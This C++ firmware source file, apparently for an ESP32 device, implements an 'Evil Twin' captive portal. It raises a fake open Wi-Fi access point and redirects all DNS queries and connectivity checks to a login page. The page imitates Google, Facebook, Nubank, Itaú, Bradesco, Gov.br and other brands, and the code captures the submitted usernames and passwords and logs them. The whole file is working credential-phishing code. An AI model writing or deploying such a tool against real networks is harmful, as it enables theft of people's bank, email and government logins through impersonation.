/**
 * @file captive_portal.cpp
 * @brief Implementação do Captive Portal para Evil Twin
 *
 * Cria um AP falso com portal cativo para capturar credenciais.
 */

#include "captive_portal.h"
#include "../core/globals.h"
#include <vector>

// Instância global
CaptivePortal captive_portal;

// DNS Server port
const byte DNS_PORT = 53;

struct PortalTheme {
  const char *title;
  const char *background_css;
  const char *button_css;
  const char *logo_text;
  const char *text_color;
};

// Configurações de tema para cada template
static PortalTheme getTheme(PortalTemplate tmpl) {
  switch (tmpl) {
  case PORTAL_GOOGLE:
    return {"Sign in - Google", "#f8f9fa", "#1a73e8", "Google", "#202124"};
  case PORTAL_FACEBOOK:
    return {"Facebook - Log In", "#f0f2f5", "#1877f2", "Facebook", "#1c1e21"};
  case PORTAL_NETFLIX:
    return {"Netflix", "#000000", "#e50914", "NETFLIX", "#ffffff"};
  case PORTAL_STARBUCKS:
    return {"Starbucks WiFi", "#1e3932", "#008248", "Starbucks", "#000000"};
  case PORTAL_MAGALU:
    return {"Magazine Luiza", "#0086ff", "#0086ff", "Magalu", "#333333"};
  case PORTAL_CLARO:
    return {"Minha Claro", "#ffffff", "#e31c23", "Claro", "#e31c23"};
  case PORTAL_VIVO:
    return {"Vivo Fibra", "#660099", "#660099", "Vivo", "#ffffff"};
  case PORTAL_TIM:
    return {"TIM WiFi", "#ffffff", "#005baa", "TIM", "#005baa"};
  case PORTAL_ITAU:
    return {"Itaú", "#ec7000", "#ec7000", "Itaú", "#333333"};
  case PORTAL_BRADESCO:
    return {"Bradesco", "#cc092f", "#cc092f", "Bradesco", "#ffffff"};
  case PORTAL_MCDONALDS:
    return {"McDonald's Free WiFi", "#ffc72c", "#db0007", "McDonald's",
            "#000000"};
  case PORTAL_INSTAGRAM:
    return {"Instagram", "#fafafa", "#3897f0", "Instagram", "#262626"};
  case PORTAL_NUBANK:
    return {"Nubank", "#820ad1", "#820ad1", "Nubank", "#ffffff"};
  case PORTAL_CAIXA:
    return {"Caixa Econômica", "#005ca9", "#f6801c", "CAIXA", "#ffffff"};
  case PORTAL_BB:
    return {"Banco do Brasil", "#ffef38", "#003da5", "Banco do Brasil",
            "#003da5"};
  case PORTAL_SANTANDER:
    return {"Santander", "#ec0000", "#ec0000", "Santander", "#ffffff"};
  case PORTAL_INTER:
    return {"Banco Inter", "#ff7a00", "#ff7a00", "Inter", "#333333"};
  case PORTAL_GOVBR:
    return {"Gov.br", "#003da5", "#003da5", "gov.br", "#ffffff"};
  case PORTAL_MERCADOLIVRE:
    return {"Mercado Livre", "#ffe600", "#2d3277", "MercadoLivre", "#2d3277"};
  case PORTAL_SHOPEE:
    return {"Shopee", "#ee4d2d", "#ee4d2d", "Shopee", "#ffffff"};
  case PORTAL_WHATSAPP:
    return {"WhatsApp", "#25d366", "#128c7e", "WhatsApp", "#ffffff"};
  default:
    return {"WiFi Login", "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
            "linear-gradient(135deg, #667eea 0%, #764ba2 100%)", "📶 WiFi",
            "#333333"};
  }
}

// HTML Templates dinâmico
String generateHTML(PortalTemplate tmpl) {
  PortalTheme theme = getTheme(tmpl);

  // HTML Base
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>)rawliteral";
  html += theme.title;
  html += R"rawliteral(</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: )rawliteral";
  html += theme.background_css;
  html += R"rawliteral(;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
      max-width: 400px;
      width: 90%;
    }
    h1 { color: )rawliteral";
  html += (String(theme.background_css).indexOf("#000000") >= 0
               ? "#333"
               : theme.text_color); // Ajuste simples
  html +=
      R"rawliteral(; margin-bottom: 20px; text-align: center; font-size: 24px; }
    .input-group { margin-bottom: 20px; }
    input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      margin-bottom: 10px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: )rawliteral";
  html += theme.button_css;
  html += R"rawliteral(;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    .logo { text-align: center; margin-bottom: 30px; font-size: 32px; font-weight: bold; color: )rawliteral";
  html += (tmpl == PORTAL_CLARO ? "#e31c23" : "#333");
  html += R"rawliteral(; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">)rawliteral";
  html += theme.logo_text;
  html += R"rawliteral(</div>
    <h1>Conectar</h1>
    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Usuário / Email / CPF" required>
      <input type="password" name="password" placeholder="Senha" required>
      <button type="submit">Entrar</button>
    </form>
  </div>
</body>
</html>
)rawliteral";
  return html;
}

const char *CaptivePortal::HTML_SUCCESS = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Conectado</title>
  <style>
    body {
      font-family: sans-serif;
      background: #4CAF50;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }
  </style>
</head>
<body>
  <div>
    <h1>✅ Conectado!</h1>
    <p>Acesso liberado.</p>
  </div>
</body>
</html>
)rawliteral";

CaptivePortal::CaptivePortal()
    : _server(nullptr), _active(false), _template(PORTAL_GENERIC) {}

bool CaptivePortal::begin(const char *ssid, PortalTemplate template_type) {
  if (_active)
    stop();

  Serial.printf("[PORTAL] Iniciando Evil Twin: %s\n", ssid);

  _template = template_type;

  // Inicia AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  delay(100);

  IPAddress ip = WiFi.softAPIP();
  Serial.printf("[PORTAL] AP IP: %s\n", ip.toString().c_str());

  // Inicia DNS servidor (redireciona tudo para o AP)
  _dnsServer.start(DNS_PORT, "*", ip);
  Serial.println("[PORTAL] DNS Captive iniciado");

  // Inicia web server
  _server = new AsyncWebServer(80);
  setupRoutes();
  _server->begin();
  Serial.println("[PORTAL] Web Server iniciado");

  _active = true;
  return true;
}

void CaptivePortal::stop() {
  if (!_active)
    return;

  Serial.println("[PORTAL] Parando portal...");

  _dnsServer.stop();

  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }

  WiFi.softAPdisconnect(true);
  _active = false;
}

void CaptivePortal::update() {
  if (_active) {
    _dnsServer.processNextRequest();
  }
}

void CaptivePortal::setupRoutes() {
  // Página principal - login
  _server->on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send(200, "text/html", getLoginPage());
  });

  // Captive portal detection endpoints
  _server->on("/generate_204", HTTP_GET,
              [this](AsyncWebServerRequest *request) {
                request->send(200, "text/html", getLoginPage());
              });

  _server->on("/hotspot-detect.html", HTTP_GET,
              [this](AsyncWebServerRequest *request) {
                request->send(200, "text/html", getLoginPage());
              });

  _server->on("/connecttest.txt", HTTP_GET,
              [this](AsyncWebServerRequest *request) {
                request->send(200, "text/html", getLoginPage());
              });

  // Handler de login
  _server->on("/login", HTTP_POST, [this](AsyncWebServerRequest *request) {
    handleCredentials(request);
  });

  // Qualquer outra rota
  _server->onNotFound([this](AsyncWebServerRequest *request) {
    request->send(200, "text/html", getLoginPage());
  });
}

String CaptivePortal::getLoginPage() { return generateHTML(_template); }

String CaptivePortal::getSuccessPage() { return String(HTML_SUCCESS); }

void CaptivePortal::handleCredentials(AsyncWebServerRequest *request) {
  CapturedCredential cred;
  memset(&cred, 0, sizeof(cred));

  if (request->hasParam("username", true)) {
    strncpy(cred.username, request->getParam("username", true)->value().c_str(),
            63);
  }
  if (request->hasParam("password", true)) {
    strncpy(cred.password, request->getParam("password", true)->value().c_str(),
            63);
  }

  strncpy(cred.ip_address, request->client()->remoteIP().toString().c_str(),
          15);
  cred.timestamp = millis();

  _credentials.push_back(cred);

  Serial.println("[PORTAL] ==============================");
  Serial.println("[PORTAL] CREDENCIAIS CAPTURADAS!");
  Serial.printf("[PORTAL] User: %s\n", cred.username);
  Serial.printf("[PORTAL] Pass: %s\n", cred.password);
  Serial.printf("[PORTAL] IP: %s\n", cred.ip_address);
  Serial.println("[PORTAL] ==============================");

  // Incrementa contador global
  g_state.handshakes_captured++;

  request->send(200, "text/html", getSuccessPage());
}

int CaptivePortal::getConnectedClients() { return WiFi.softAPgetStationNum(); }
